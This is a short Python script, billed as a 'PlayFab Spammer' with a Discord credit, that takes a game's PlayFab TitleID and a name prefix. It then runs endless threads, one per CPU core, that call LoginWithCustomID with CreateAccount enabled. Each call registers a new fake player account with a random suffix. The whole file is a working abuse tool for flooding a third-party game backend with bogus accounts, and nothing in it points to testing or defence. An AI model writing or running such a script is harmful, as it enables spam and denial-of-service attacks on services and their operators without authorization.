import threading, secrets, os
from playfab import PlayFabClientAPI, PlayFabSettings

print("PlayFab Spammer made by, @.index | https://discord.gg/GSWSahAmVU")

PlayFabSettings.TitleId = input('TitleID: ')
name = temp = input('CustomID Name: ')

print(f"\u001B[36m{PlayFabSettings.TitleId} | Spamming with {name}")

def callback(success, failure):
    if success: print(f"\u001B[32m{PlayFabSettings.TitleId} | Created \u001B[0m\u001B[34m{name}\u001B[0m")
    if failure: print(f"\u001B[41m\u001B[30m{PlayFabSettings.TitleId} | Could not create \u001B[0m\u001B[41m\u001B[34m{name}\u001B[0m")

def spam():
    while True:
        name = temp + secrets.token_hex(5).upper()
        PlayFabClientAPI.LoginWithCustomID({
            "CustomId": name,
            "DisplayName": name,
            "CreateAccount": True
        }, callback)

threads = []
for _ in range(os.cpu_count()):
    threads.append(threading.Thread(target=spam, daemon=True))
for thread in threads: thread.start()